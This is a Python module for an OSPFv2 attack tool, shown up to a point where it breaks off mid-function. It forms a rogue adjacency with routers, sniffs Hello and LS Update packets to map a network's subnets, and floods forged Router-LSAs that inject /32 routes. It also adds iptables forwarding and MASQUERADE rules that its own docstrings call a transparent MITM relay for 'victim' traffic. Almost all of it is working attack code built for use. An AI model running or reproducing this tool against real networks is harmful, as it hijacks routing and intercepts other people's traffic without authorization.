#!/usr/bin/env python3
# v2.0
"""
ospf_adjacency.py — OSPFv2 full-adjacency engine + route injection + MITM relay.

Self-contained module.  Used two ways:

  Standalone CLI:
      sudo python3 ospf_adjacency.py --iface eth0 [--vlan 20]
      Runs the interactive engine with a menu (add Router-LSA routes, show LSDB).

  As a library (called by main.py):
      sniff_ospf_hellos(iface)             -> passively learn SVI parameters from
                                              OSPF Hello packets before forming
                                              any adjacency
      launch_in_terminal(interface, ...)   -> spawn the full-adjacency engine in a
                                              new terminal so its menu stays usable
      wait_for_adjacency_exchange(iface)   -> block until LS exchange is seen

  MITM relay helpers (all Linux-only):
      enable_ip_forwarding()               -> save and enable ip_forward
      restore_ip_forwarding(old)           -> write back saved value
      setup_forwarding(in_iface, out)      -> iptables FORWARD + MASQUERADE rules
      teardown_forwarding(in_iface, out)   -> remove those rules
      withdraw_injected_routes(context)    -> MaxAge-flood our Router-LSA to pull
                                              injected stubs from neighbours' RIBs
"""
from __future__ import annotations
import argparse
import ipaddress
import os
import platform
import shlex
import shutil
import socket
import subprocess
import sys
import threading
import time
from pathlib import Path

try:
    from scapy.all import Ether, IP, conf as scapy_conf, get_if_addr, sendp, sniff
    from scapy.contrib.ospf import (
        OSPF_DBDesc,
        OSPF_Hdr,
        OSPF_Hello,
        OSPF_LSA_Hdr,
        OSPF_LSAck,
        OSPF_LSReq,
        OSPF_LSUpd,
        OSPF_Link,
        OSPF_Network_LSA,
        OSPF_Router_LSA,
    )
except ImportError:
    sys.exit("[!] pip install scapy  (Windows: also install Npcap)")

ALL_SPF_MULTICAST = "224.0.0.5"
ALL_DR_MULTICAST = "224.0.0.6"
ALL_SPF_MAC = "01:00:5e:00:00:05"
ALL_DR_MAC = "01:00:5e:00:00:06"
OSPF_PROTO = getattr(socket, "IPPROTO_OSPF", 89)
OSPF_OPTIONS = 0x02
DEAD_INTERVAL = 40
HELLO_INTERVAL = 10
INITIAL_DBD_SEQ = 1000
BASE_LSA_SEQUENCE = 0x80000001
BACKBONE_AREA = "0.0.0.0"
DEFAULT_ROUTER_ID = "99.99.99.99"
OSPF_SNIFF_FILTER = "ip proto 89 or (vlan and ip proto 89)"
OSPF_NBR_ROUTES_DB = {}
AUTO_ROUTE_IP_ENV = "OSPF_AUTO_ROUTE_IP"

OSPF_AREA_ID_ENV = "OSPF_AREA_ID"
OSPF_DEAD_INTERVAL_ENV = "OSPF_DEAD_INTERVAL"

DOWN = "DOWN"
INIT = "INIT"
TWO_WAY = "TWO_WAY"
EXSTART = "EXSTART"
EXCHANGE = "EXCHANGE"
LOADING = "LOADING"
FULL = "FULL"

ACTIVE_NEIGHBOR_STATES = (INIT, TWO_WAY, EXSTART, EXCHANGE, LOADING, FULL)
DBD_READY_STATES = (EXSTART, EXCHANGE, LOADING, FULL)
MENU_HELP_TEXT = (
    "[MENU] Available commands: '1' adds a Router-LSA route, '2' shows neighbours, "
    "'3' shows the LSDB, '4' shows OSPF_NBR_ROUTES_DB, '5' enumerates OSPF subnets "
    "(VLAN SVIs), 'q' hides the menu prompt, 'm' shows it again."
)
MENU_PROMPT = "ospf-menu> "
MENU_HIDDEN_PROMPT = "ospf-menu(hidden)> "
MENU_HIDDEN_TEXT = "[MENU] The menu prompt is hidden. Type 'm' to show it again."


def log_message(message):
    sys.stdout.write(f"[{time.strftime('%H:%M:%S')}] {message}\n")
    sys.stdout.flush()


# ── Passive OSPF Hello sniffing ───────────────────────────────────────────────

def sniff_ospf_hellos(iface, timeout=30):
    """Passively sniff OSPF Hello packets on 224.0.0.5 to learn SVI parameters.

    Collects all unique Hello sources seen during the timeout window (de-duped
    by router_id).  Returns a list of param dicts, ordered by first appearance.
    Returns an empty list on timeout.  The caller uses ospf_hellos[0] for
    adjacency formation and passes the full list to the debug menu.

    Each dict contains:
        router_id      OSPF router ID of the SVI
        src_ip         SVI interface IP (= subnet gateway)
        netmask        Interface netmask
        area_id        OSPF area identifier
        hello_interval Hello interval in seconds
        dead_interval  Dead interval in seconds
        options        Options byte (E-bit set = normal area, clear = stub)
        auth_type      0=none  1=simple-password  2=MD5
        dr             Designated Router IP
        bdr            Backup DR IP
    """
    seen_ids = {}  # router_id -> param dict, insertion-ordered

    def _handle(pkt):
        if not (pkt.haslayer(OSPF_Hdr) and pkt.haslayer(OSPF_Hello) and pkt.haslayer(IP)):
            return
        if pkt[OSPF_Hdr].type != 1:
            return
        rid = str(pkt[OSPF_Hdr].src)
        if rid in seen_ids:
            return
        h = pkt[OSPF_Hello]
        seen_ids[rid] = {
            "router_id":      rid,
            "src_ip":         str(pkt[IP].src),
            "netmask":        str(h.mask),
            "area_id":        str(pkt[OSPF_Hdr].area),
            "hello_interval": int(h.hellointerval),
            "dead_interval":  int(h.deadinterval),
            "options":        int(h.options),
            "auth_type":      int(getattr(pkt[OSPF_Hdr], "authtype", 0)),
            "dr":             str(h.router),
            "bdr":            str(h.backup),
        }

    log_message(f"[OSPF] Sniffing OSPF Hellos on {iface} for {timeout}s ...")
    sniff(iface=iface, filter=OSPF_SNIFF_FILTER, prn=_handle, store=False, timeout=timeout)

    results = list(seen_ids.values())
    if not results:
        log_message(f"[OSPF] No OSPF Hellos received on {iface} within {timeout}s.")
        return []

    _auth_names = {0: "none", 1: "simple-password", 2: "MD5"}
    for p in results:
        import ipaddress as _ip
        try:
            subnet = _ip.IPv4Network(f"{p['src_ip']}/{p['netmask']}", strict=False)
        except Exception:
            subnet = f"{p['src_ip']}/{p['netmask']}"
        log_message(f"[OSPF] SVI  router_id={p['router_id']}  ip={p['src_ip']}  "
                    f"subnet={subnet}  area={p['area_id']}  "
                    f"hello={p['hello_interval']}s  dead={p['dead_interval']}s  "
                    f"auth={_auth_names.get(p['auth_type'], '?')}  "
                    f"E-bit={'1' if p['options'] & 0x02 else '0(stub)'}")
    return results


# ── OSPF LSDB passive sniffer ────────────────────────────────────────────────

def sniff_ospf_lsdb_subnets(iface, out_list, timeout=120):
    """Sniff LS Update packets and extract all advertised subnets into out_list.

    Designed to run in a background daemon thread started just before adjacency
    formation.  The LSDB exchange floods all Router-LSAs and Network-LSAs during
    the EXCHANGE/LOADING phase; sniffing the wire captures the full topology
    without needing access to the adjacency engine's internal context.

    Parses:
      Type-1 Router-LSA — stub links (link type=3): directly connected subnets
      Type-2 Network-LSA — transit/broadcast segment subnets

    Each entry appended to out_list:
      prefix       "192.168.1.0/24"
      network      "192.168.1.0"
      netmask      "255.255.255.0"
      adv_router   advertising router ID
      lsa_type     "Router-LSA" | "Network-LSA"
      metric       TOS-0 cost (Router-LSA only, else 0)
    """
    seen = set()

    def _add(net_str, mask_str, adv, lsa_label, metric=0):
        try:
            network = ipaddress.IPv4Network(f"{net_str}/{mask_str}", strict=False)
        except Exception:
            return
        key = str(network)
        if key in seen:
            return
        seen.add(key)
        out_list.append({
            "prefix":     str(network),
            "network":    str(network.network_address),
            "netmask":    str(network.netmask),
            "adv_router": adv,
            "lsa_type":   lsa_label,
            "metric":     metric,
        })

    def _handle(pkt):
        if not (pkt.haslayer(OSPF_Hdr) and pkt.haslayer(OSPF_LSUpd)):
            return
        for lsa in getattr(pkt[OSPF_LSUpd], "lsalist", []):
            lsa_type  = getattr(lsa, "type", None)
            adv       = str(getattr(lsa, "adrouter", "?"))
            if lsa_type == 1:  # Router-LSA: scan stub links
                for link in getattr(lsa, "linklist", []):
                    if int(getattr(link, "type", 0)) != 3:
                        continue
                    _add(str(getattr(link, "id",   "0.0.0.0")),
                         str(getattr(link, "data", "0.0.0.0")),
                         adv, "Router-LSA",
                         int(getattr(link, "metric", 0)))
            elif lsa_type == 2:  # Network-LSA: the DR's interface IP + mask
                _add(str(getattr(lsa, "id",   "0.0.0.0")),
                     str(getattr(lsa, "mask", "255.255.255.0")),
                     adv, "Network-LSA")

    log_message(f"[LSDB] Background subnet sniffer started on {iface} (timeout={timeout}s)")
    sniff(iface=iface, filter=OSPF_SNIFF_FILTER, prn=_handle, store=False, timeout=timeout)
    log_message(f"[LSDB] Subnet sniffer done — {len(out_list)} unique network(s) captured")


# ── IP forwarding + iptables MITM relay helpers ───────────────────────────────

_IP_FORWARD_PATH = "/proc/sys/net/ipv4/ip_forward"


def enable_ip_forwarding():
    """Enable IPv4 forwarding; return the previous value so it can be restored."""
    try:
        with open(_IP_FORWARD_PATH) as f:
            old = f.read().strip()
    except OSError:
        old = "0"
    try:
        with open(_IP_FORWARD_PATH, "w") as f:
            f.write("1\n")
        log_message(f"[FWD] ip_forward enabled (was {old!r})")
    except OSError as exc:
        log_message(f"[WARN] Could not enable ip_forward: {exc}")
    return old


def restore_ip_forwarding(old_value):
    """Write back the previously saved ip_forward value."""
    try:
        with open(_IP_FORWARD_PATH, "w") as f:
            f.write(f"{old_value}\n")
        log_message(f"[FWD] ip_forward restored to {old_value!r}")
    except OSError as exc:
        log_message(f"[WARN] Could not restore ip_forward: {exc}")


def _iptables(args, *, check=False):
    result = subprocess.run(["iptables"] + args, capture_output=True, text=True, check=False)
    if result.returncode != 0 and check:
        log_message(f"[WARN] iptables {' '.join(args)}: {result.stderr.strip()}")
    return result.returncode == 0


def setup_forwarding(in_iface, out_iface):
    """Add iptables FORWARD accept + MASQUERADE rules for transparent MITM relay.

    Victim packets arriving on in_iface destined for the injected /32 are
    forwarded out out_iface toward the real next-hop.  MASQUERADE rewrites the
    source IP to ours so the real destination routes replies back to us rather
    than directly to the victim — keeping the session symmetric.

    Tradeoff: NAT (MASQUERADE) is simpler than injecting a reverse LSA for the
    victim prefix, but the target sees our IP rather than the victim's.  Return
    traffic is visible to us (we can proxy-inspect) but not passively sniffable
    as unmodified victim→target flows.  A reverse Type-1 /32 LSA for the victim
    would preserve source IPs at the cost of needing the victim's prefix up-front.
    """
    _iptables(["-A", "FORWARD", "-i", in_iface, "-o", out_iface, "-j", "ACCEPT"])
    _iptables(["-A", "FORWARD", "-i", out_iface, "-o", in_iface,
               "-m", "state", "--state", "RELATED,ESTABLISHED", "-j", "ACCEPT"])
    _iptables(["-t", "nat", "-A", "POSTROUTING", "-o", out_iface, "-j", "MASQUERADE"])
    log_message(f"[FWD] Forwarding rules added: {in_iface} → {out_iface} (MASQUERADE)")


def teardown_forwarding(in_iface, out_iface):
    """Remove the iptables rules added by setup_forwarding()."""
    _iptables(["-D", "FORWARD", "-i", in_iface, "-o", out_iface, "-j", "ACCEPT"])
    _iptables(["-D", "FORWARD", "-i", out_iface, "-o", in_iface,
               "-m", "state", "--state", "RELATED,ESTABLISHED", "-j", "ACCEPT"])
    _iptables(["-t", "nat", "-D", "POSTROUTING", "-o", out_iface, "-j", "MASQUERADE"])
    log_message(f"[FWD] Forwarding rules removed: {in_iface} → {out_iface}")


def add_default_route(gateway_ip, iface):
    """Add a default route via the OSPF-learned SVI so forwarded packets reach the internet."""
    result = subprocess.run(
        ["ip", "route", "add", "default", "via", gateway_ip, "dev", iface],
        capture_output=True, text=True, check=False,
    )
    if result.returncode != 0:
        if "File exists" in result.stderr or "RTNETLINK answers: File exists" in result.stderr:
            log_message(f"[FWD] Default route via {gateway_ip} already exists")
        else:
            log_message(f"[WARN] Could not add default route via {gateway_ip}: {result.stderr.strip()}")
    else:
        log_message(f"[FWD] Default route added: default via {gateway_ip} dev {iface}")


def remove_default_route(gateway_ip, iface):
    """Remove the default route added by add_default_route()."""
    result = subprocess.run(
        ["ip", "route", "del", "default", "via", gateway_ip, "dev", iface],
        capture_output=True, text=True, check=False,
    )
    if result.returncode == 0:
        log_message(f"[FWD] Default route via {gateway_ip} removed")
    else:
        log_message(f"[WARN] Could not remove default route via {gateway_ip}: {result.stderr.strip()}")


def withdraw_injected_routes(context):
    """Withdraw our Router-LSA by re-flooding it with age=MaxAge (3600).

    Per RFC 2328 §14.1: when neighbours receive a MaxAge LSA they install it,
    then purge it and any routes it installed from their LSDB/RIB.  This cleanly
    removes the injected /32 stub without waiting for natural LSA expiry.
    """
    with context["lock"]:
        existing = find_lsa(context, 1, context["router_id"], context["router_id"])
        if existing is None:
            log_message("[TEARDOWN] No self Router-LSA found; nothing to withdraw.")
            return
        maxage_lsa = existing.copy()
    maxage_lsa.age = 3600
    try:
        flood_lsa_packets(context, [maxage_lsa])
        log_message("[TEARDOWN] Flooded MaxAge Router-LSA — injected routes will be purged.")
    except Exception as exc:
        log_message(f"[TEARDOWN] Could not flood MaxAge LSA: {exc}")


# ── Router-LSA route injection (inlined from former ospf_route_addition.py) ────

def normalize_metric(metric):
    metric_value = int(metric)
    if not 0 <= metric_value <= 0xFFFF:
        raise ValueError("Metric must be between 0 and 65535.")
    return metric_value


def add_router_stub_route(context, prefix, mask, metric, *, normalize_network, ospf_link_cls, next_lsa_sequence, build_router_lsa, upsert_lsa, flood_lsa_packets, log_message):
    network_prefix, network_mask = normalize_network(prefix, mask)
    stub_link = ospf_link_cls(type=3, id=network_prefix, data=network_mask, metric=normalize_metric(metric))
    with context["lock"]:
        context["manual_router_links"] = [
            existing_link.copy()
            for existing_link in context["manual_router_links"]
            if (existing_link.id, existing_link.data) != (stub_link.id, stub_link.data)
        ]
        context["manual_router_links"].append(stub_link.copy())
        sequence_number = next_lsa_sequence(context, 1, context["router_id"], context["router_id"])
        router_lsa = build_router_lsa(context, sequence_number=sequence_number)
        upsert_lsa(context, router_lsa)
    flooded = flood_lsa_packets(context, [router_lsa])
    scope_text = "and flooded to FULL neighbors" if flooded else "in the local LSDB only"
    log_message(
        f"[ROUTES] Added Router-LSA route net={stub_link.id} mask={stub_link.data} "
        f"metric={stub_link.metric} seq=0x{router_lsa.seq:08x} {scope_text}."
    )
    return router_lsa


def prompt_and_add_router_stub_route(context, input_func, log_message, *, normalize_network, ospf_link_cls, next_lsa_sequence, build_router_lsa, upsert_lsa, flood_lsa_packets):
    try:
        prefix = input_func("  Router-LSA network: ").strip()
        mask = input_func("  Router-LSA mask: ").strip()
        metric_text = input_func("  Router-LSA metric [10]: ").strip()
        metric = int(metric_text) if metric_text else 10
        add_router_stub_route(context, prefix, mask, metric, normalize_network=normalize_network, ospf_link_cls=ospf_link_cls, next_lsa_sequence=next_lsa_sequence, build_router_lsa=build_router_lsa, upsert_lsa=upsert_lsa, flood_lsa_packets=flood_lsa_packets, log_message=log_message)
    except ValueError as exc:
        log_message(f"[MENU] Could not update Router-LSA: {exc}")
    except EOFError:
        return


def default_iface():
    try:
        interface_name = getattr(scapy_conf.iface, "name", str(scapy_conf.iface))
        if interface_name and interface_name != "None":
            return interface_name
    except Exception:
        pass
    return "Ethernet" if platform.system() == "Windows" else "eth0"


def linux_interface_exists(interface_name):
    if platform.system().lower() != "linux" or not shutil.which("ip"):
        return False
    result = subprocess.run(
        ["ip", "link", "show", "dev", interface_name],
        capture_output=True,
        text=True,
        check=False,
    )
    return result.returncode == 0


def ensure_vlan_subinterface(interface_name, vlan_id):
    """Create/use a Linux VLAN subinterface for OSPF when --vlan is supplied."""
    if vlan_id is None:
        return interface_name

    vlan_id = int(vlan_id)
    if not 1 <= vlan_id <= 4094:
        sys.exit(f"[!] Invalid VLAN ID: {vlan_id}")
    if platform.system().lower() != "linux":
        sys.exit("[!] --vlan requires Linux/Kali VLAN subinterface support.")
    if not shutil.which("ip"):
        sys.exit("[!] --vlan requires the Linux 'ip' command.")

    if interface_name.endswith(f".{vlan_id}"):
        subinterface = interface_name
        parent_interface = interface_name.rsplit(".", 1)[0]
    else:
        parent_interface = interface_name
        subinterface = f"{interface_name}.{vlan_id}"

    if not linux_interface_exists(subinterface):
        result = subprocess.run(
            ["ip", "link", "add", "link", parent_interface, "name", subinterface, "type", "vlan", "id", str(vlan_id)],
            capture_output=True,
            text=True,
            check=False,
        )
        if result.returncode != 0:
            sys.exit(f"[!] Could not create VLAN subinterface {subinterface}: {result.stderr.strip()}")
        log_message(f"[VLAN] Created {subinterface} on {parent_interface} for VLAN {vlan_id}.")
    else:
        log_message(f"[VLAN] Using existing VLAN subinterface {subinterface}.")

    for target_interface in (parent_interface, subinterface):
        result = subprocess.run(
            ["ip", "link", "set", target_interface, "up"],
            capture_output=True,
            text=True,
            check=False,
        )
        if result.returncode != 0:
            sys.exit(f"[!] Could not bring {target_interface} up: {result.stderr.strip()}")

    return subinterface


def read_interface_ip(interface_name):
    try:
        address = get_if_addr(interface_name)
        if address and address != "0.0.0.0":
            return address
    except Exception:
        pass
    if platform.system() == "Windows":
        try:
            if interface_name.startswith("\\Device\\"):
                alias = scapy_conf.ifaces.dev_from_networkname(interface_name).name
                address = get_if_addr(alias)
            else:
                network_name = scapy_conf.ifaces.dev_from_name(interface_name).network_name
                address = get_if_addr(network_name)
            if address and address != "0.0.0.0":
                return address
        except Exception:
            pass
    return None


def read_interface_netmask(interface_name):
    try:
        if platform.system() == "Windows":
            alias = interface_name
            try:
                if interface_name.startswith("\\Device\\"):
                    alias = scapy_conf.ifaces.dev_from_networkname(interface_name).name
                else:
                    alias = scapy_conf.ifaces.dev_from_name(interface_name).name
            except Exception:
                pass
            result = subprocess.run(
                [
                    "netsh",
                    "interface",
                    "ipv4",
                    "show",
                    "addresses",
                    f"name={alias}",
                ],
                capture_output=True,
                text=True,
                check=False,
            )
            prefix_text = ""
            for line in result.stdout.splitlines():
                if "(mask " in line:
                    prefix_text = line.split("(mask ", 1)[1].split(")", 1)[0].strip()
                    break
                if "Subnet Mask" in line:
                    prefix_text = line.split(":", 1)[1].strip()
                    break
        else:
            result = subprocess.run(
                ["ip", "-o", "-f", "inet", "addr", "show", "dev", interface_name],
                capture_output=True,
                text=True,
                check=False,
            )
            prefix_text = ""
            for token in result.stdout.split():
                if "/" in token and token.count(".") == 3:
                    prefix_text = token.split("/", 1)[1]
                    break
        if prefix_text.count(".") == 3:
            return prefix_text
        if prefix_text.isdigit():
            return str(ipaddress.IPv4Network(f"0.0.0.0/{prefix_text}", strict=False).netmask)
    except Exception:
        pass
    return None


def read_interface_state(interface_name):
    address = read_interface_ip(interface_name)
    netmask = read_interface_netmask(interface_name) if address else None
    if address and netmask:
        return address, netmask
    return None, None


def make_neighbor(router_id, ip_address):
    return {
        "router_id": router_id,
        "ip_address": ip_address,
        "mac_address": "ff:ff:ff:ff:ff:ff",
        "state": DOWN,
        "priority": 0,
        "designated_router": "0.0.0.0",
        "backup_designated_router": "0.0.0.0",
        "database_sequence": 0,
        "is_master": False,
        "last_seen": time.time(),
        "requested_lsas": [],
        "last_peer_seq_in": None,   # last slave seq we processed (duplicate guard)
        "last_sent_dbd": None,      # cached master DBD to resend on slave retransmit
    }


def make_context(interface_name, source_ip, network_mask, hello_interval,
                 auto_route_ip=None, area_id=BACKBONE_AREA, dead_interval=DEAD_INTERVAL):
    return {
        "interface_name": interface_name,
        "source_ip": source_ip,
        "router_id": DEFAULT_ROUTER_ID,
        "network_mask": network_mask,
        "area_id": area_id,
        "designated_router": "0.0.0.0",
        "backup_designated_router": "0.0.0.0",
        "hello_interval": hello_interval,
        "dead_interval": dead_interval,
        "local_lsdb": [],
        "neighbors": {},
        "lock": threading.RLock(),
        "manual_router_links": [],
        "adjacency_ready_event": threading.Event(),
        "stop_event": threading.Event(),
        "menu_suppressed": False,
        "source_ip_available": True,
        "ospf_raw_socket": None,
        "ospf_raw_socket_warning_logged": False,
        "auto_route_ip": auto_route_ip,
        "auto_route_added": False,
    }


def close_ospf_raw_socket(context):
    with context["lock"]:
        raw_socket = context["ospf_raw_socket"]
        context["ospf_raw_socket"] = None
    if raw_socket is None:
        return
    try:
        raw_socket.close()
    except OSError:
        pass


def drain_ospf_raw_socket(context, raw_socket):
    while not context["stop_event"].is_set():
        try:
            raw_socket.recv(65535)
        except socket.timeout:
            continue
        except OSError:
            break
    with context["lock"]:
        if context["ospf_raw_socket"] is raw_socket:
            context["ospf_raw_socket"] = None
    try:
        raw_socket.close()
    except OSError:
        pass


def ensure_ospf_raw_socket(context):
    with context["lock"]:
        if context["ospf_raw_socket"] is not None or not context["source_ip_available"]:
            return
        source_ip = context["source_ip"]
    try:
        raw_socket = socket.socket(socket.AF_INET, socket.SOCK_RAW, OSPF_PROTO)
        raw_socket.bind((source_ip, 0))
        raw_socket.settimeout(1.0)
    except OSError as exc:
        with context["lock"]:
            if context["ospf_raw_socket_warning_logged"]:
                return
            context["ospf_raw_socket_warning_logged"] = True
        log_message(
            f"[WARN] Could not bind a raw IP protocol {OSPF_PROTO} receiver on {source_ip}: {exc}. "
            "Inbound OSPF may still trigger ICMP protocol-unreachable replies from the host."
        )
        return
    with context["lock"]:
        context["ospf_raw_socket"] = raw_socket
        context["ospf_raw_socket_warning_logged"] = False
    threading.Thread(target=drain_ospf_raw_socket, args=(context, raw_socket), daemon=True).start()


def send_packet(context, payload, destination=ALL_SPF_MULTICAST):
    if not payload.haslayer(OSPF_Hdr):
        raise ValueError("send_packet() expected an OSPF payload that already contains OSPF_Hdr.")
    if payload[OSPF_Hdr].type == 1 and destination != ALL_SPF_MULTICAST:
        raise ValueError("OSPF Hello packets in this broadcast-segment script must be sent to 224.0.0.5.")
    if destination == ALL_SPF_MULTICAST:
        ethernet_destination = ALL_SPF_MAC
    elif destination == ALL_DR_MULTICAST:
        ethernet_destination = ALL_DR_MAC
    else:
        ethernet_destination = "ff:ff:ff:ff:ff:ff"
        with context["lock"]:
            for neighbor in context["neighbors"].values():
                if neighbor["ip_address"] == destination:
                    ethernet_destination = neighbor["mac_address"]
                    break
    frame = Ether(dst=ethernet_destination) / IP(src=context["source_ip"], dst=destination, proto=OSPF_PROTO, ttl=1) / payload
    sendp(frame, iface=context["interface_name"], verbose=False)


def build_header(context, packet_type):
    return OSPF_Hdr(version=2, type=packet_type, src=context["router_id"], area=context["area_id"])


def build_ls_update(context, lsa_packets):
    return build_header(context, 4) / OSPF_LSUpd(lsalist=[lsa_packet.copy() for lsa_packet in lsa_packets])


def local_lsdb_entries(context, copy_packets=False):
    with context["lock"]:
        lsa_packets = context["local_lsdb"]
        if copy_packets:
            return [lsa_packet.copy() for lsa_packet in lsa_packets]
        return list(lsa_packets)


def build_hello(context):
    with context["lock"]:
        neighbor_ids = [
            neighbor["router_id"]
            for neighbor in context["neighbors"].values()
            if neighbor["state"] in ACTIVE_NEIGHBOR_STATES
        ]
    return build_header(context, 1) / OSPF_Hello(
        mask=context["network_mask"],
        hellointerval=context["hello_interval"],
        options=OSPF_OPTIONS,
        prio=0,
        deadinterval=DEAD_INTERVAL,
        router=context["designated_router"],
        backup=context["backup_designated_router"],
        neighbors=neighbor_ids,
    )


def build_dbd(context, _neighbor_entry, is_initial_packet=False, has_more_packets=False, is_master_packet=True, sequence_number=0, lsa_headers=None):
    database_description_flags = (0x04 if is_initial_packet else 0) | (0x02 if has_more_packets else 0) | (0x01 if is_master_packet else 0)
    database_description_packet = build_header(context, 2) / OSPF_DBDesc(mtu=1500, options=OSPF_OPTIONS, dbdescr=database_description_flags, ddseq=sequence_number)
    for lsa_header in (lsa_headers or []):
        database_description_packet = database_description_packet / lsa_header
    return database_description_packet


def build_router_lsa(context, sequence_number=BASE_LSA_SEQUENCE):
    with context["lock"]:
        if context["designated_router"] != "0.0.0.0":
            attached_link = OSPF_Link(type=2, id=context["designated_router"], data=context["source_ip"], metric=1)
        else:
            network_prefix, network_mask = normalize_network(context["source_ip"], context["network_mask"])
            attached_link = OSPF_Link(type=3, id=network_prefix, data=network_mask, metric=1)
        link_list = [attached_link]
        link_list.extend(link.copy() for link in context["manual_router_links"])
    return OSPF_Router_LSA(
        age=1,
        options=OSPF_OPTIONS,
        type=1,
        id=context["router_id"],
        adrouter=context["router_id"],
        seq=sequence_number,
        linklist=link_list,
    )


def get_lsa_key(lsa_packet):
    return (lsa_packet.type, lsa_packet.id, lsa_packet.adrouter)


def enumerate_ospf_subnets(context):
    """Return all subnets advertised in the LSDB, derived from Router-LSA stub links.

    Each Type-1 Router-LSA contains stub links (link type=3) which represent
    directly connected networks — i.e. SVI subnets.  Collecting these gives the
    full set of VLAN subnets visible in the OSPF domain without any trunking or
    PVST+ sniffing.  Only LSAs from FULL neighbours are included.
    """
    with context["lock"]:
        lsdb = list(context["local_lsdb"])
        full_nbr_ids = {
            nbr["router_id"]
            for nbr in context["neighbors"].values()
            if nbr["state"] == FULL
        }
    subnets = []
    seen = set()
    for lsa in lsdb:
        if getattr(lsa, "type", None) != 1:
            continue
        adv = str(getattr(lsa, "adrouter", ""))
        if adv not in full_nbr_ids and adv != context["router_id"]:
            continue
        for link in getattr(lsa, "linklist", []):
            if int(getattr(link, "type", 0)) != 3:
                continue
            net, mask = normalize_network(
                str(getattr(link, "id", "0.0.0.0")),
                str(getattr(link, "data", "0.0.0.0")),
            )
            key = (net, mask)
            if key in seen:
                continue
            seen.add(key)
            subnets.append({"network": net, "netmask": mask, "adv_router": adv})
    return subnets


def rebuild_ospf_nbr_routes_db(context):
    global OSPF_NBR_ROUTES_DB
    route_map = {}
    full_neighbor_ids = {
        neighbor["router_id"]
        for neighbor in context["neighbors"].values()
        if neighbor["state"] == FULL
    }
    for lsa_packet in context["local_lsdb"]:
        if getattr(lsa_packet, "type", None) != 1:
            continue
        advertising_router = str(getattr(lsa_packet, "adrouter", "0.0.0.0"))
        if advertising_router not in full_neighbor_ids:
            continue
        routes = []
        for link in getattr(lsa_packet, "linklist", []):
            if int(getattr(link, "type", 0)) != 3:
                continue
            network, netmask = normalize_network(
                str(getattr(link, "id", "0.0.0.0")),
                str(getattr(link, "data", "0.0.0.0")),
            )
            routes.append({
                "network": network,
                "netmask": netmask,
                "metric": int(getattr(link, "metric", 0)),
                "lsa_id": str(getattr(lsa_packet, "id", "0.0.0.0")),
                "advertising_router": advertising_router,
                "sequence": f"0x{getattr(lsa_packet, 'seq', 0):08x}",
            })
        if routes:
            route_map[advertising_router] = routes
    OSPF_NBR_ROUTES_DB = route_map


def format_neighbor_status(neighbor):
    status_message = f"[STATUS] {neighbor['router_id']} state={neighbor['state']} ip={neighbor['ip_address']}"
    if neighbor["designated_router"] != "0.0.0.0" and neighbor["ip_address"] == neighbor["designated_router"]:
        status_message += f" dr={neighbor['designated_router']}"
    return status_message


def is_dr_or_bdr_neighbor(neighbor):
    return neighbor["ip_address"] in {neighbor["designated_router"], neighbor["backup_designated_router"]} and neighbor["ip_address"] != "0.0.0.0"


def find_lsa(context, lsa_type, lsa_id, advertising_router):
    for lsa_packet in context["local_lsdb"]:
        if get_lsa_key(lsa_packet) == (lsa_type, lsa_id, advertising_router):
            return lsa_packet
    return None


def upsert_lsa(context, lsa_packet):
    lsa_key = get_lsa_key(lsa_packet)
    for index, existing_lsa in enumerate(context["local_lsdb"]):
        if get_lsa_key(existing_lsa) != lsa_key:
            continue
        if getattr(lsa_packet, "seq", 0) >= getattr(existing_lsa, "seq", 0):
            context["local_lsdb"][index] = lsa_packet.copy()
            rebuild_ospf_nbr_routes_db(context)
            return True
        return False
    context["local_lsdb"].append(lsa_packet.copy())
    rebuild_ospf_nbr_routes_db(context)
    return True


def next_lsa_sequence(context, lsa_type, lsa_id, advertising_router):
    existing_lsa = find_lsa(context, lsa_type, lsa_id, advertising_router)
    if existing_lsa is None:
        return BASE_LSA_SEQUENCE
    return max(getattr(existing_lsa, "seq", BASE_LSA_SEQUENCE - 1) + 1, BASE_LSA_SEQUENCE)


def normalize_network(prefix, mask):
    network = ipaddress.IPv4Network(f"{prefix}/{mask}", strict=False)
    return str(network.network_address), str(network.netmask)


def flood_lsa_packets(context, lsa_packets):
    with context["lock"]:
        full_neighbor_ids = [
            neighbor["router_id"]
            for neighbor in context["neighbors"].values()
            if neighbor["state"] == FULL
        ]
    if not full_neighbor_ids:
        return False
    send_packet(context, build_ls_update(context, lsa_packets), destination=ALL_DR_MULTICAST)
    return True


def should_fight_back_self_lsa(context, received_lsa):
    with context["lock"]:
        existing_lsa = find_lsa(context, 1, context["router_id"], context["router_id"])
        existing_sequence = getattr(existing_lsa, "seq", BASE_LSA_SEQUENCE - 1) if existing_lsa is not None else BASE_LSA_SEQUENCE - 1
    received_sequence = getattr(received_lsa, "seq", BASE_LSA_SEQUENCE - 1)
    if received_sequence < existing_sequence:
        return False
    if received_sequence > existing_sequence:
        return True
    desired_lsa = build_router_lsa(context, sequence_number=received_sequence)
    received_links = [
        (int(getattr(link, "type", 0)), str(getattr(link, "id", "0.0.0.0")), str(getattr(link, "data", "0.0.0.0")), int(getattr(link, "metric", 0)))
        for link in getattr(received_lsa, "linklist", [])
    ]
    desired_links = [
        (int(getattr(link, "type", 0)), str(getattr(link, "id", "0.0.0.0")), str(getattr(link, "data", "0.0.0.0")), int(getattr(link, "metric", 0)))
        for link in getattr(desired_lsa, "linklist", [])
    ]
    return received_links != desired_links


def reorigin_self_router_lsa(context, sequence_number):
    with context["lock"]:
        router_lsa = build_router_lsa(context, sequence_number=sequence_number)
        upsert_lsa(context, router_lsa)
    flood_lsa_packets(context, [router_lsa])
    return router_lsa


def refresh_local_router_lsa(context, bump_sequence=False):
    with context["lock"]:
        if bump_sequence:
            sequence_number = next_lsa_sequence(context, 1, context["router_id"], context["router_id"])
        else:
            existing_lsa = find_lsa(context, 1, context["router_id"], context["router_id"])
            sequence_number = getattr(existing_lsa, "seq", BASE_LSA_SEQUENCE)
        upsert_lsa(context, build_router_lsa(context, sequence_number=sequence_number))


def maybe_add_auto_route(context):
    with context["lock"]:
        auto_route_ip = context["auto_route_ip"]
        auto_route_added = context["auto_route_added"]
        adjacency_ready = context["adjacency_ready_event"].is_set()
    if not auto_route_ip or auto_route_added or not adjacency_ready:
        return
    add_router_stub_route(
        context,
        auto_route_ip,
        "255.255.255.255",
        0,
        normalize_network=normalize_network,
        ospf_link_cls=OSPF_Link,
        next_lsa_sequence=next_lsa_sequence,
        build_router_lsa=build_router_lsa,
        upsert_lsa=upsert_lsa,
        flood_lsa_packets=flood_lsa_packets,
        log_message=log_message,
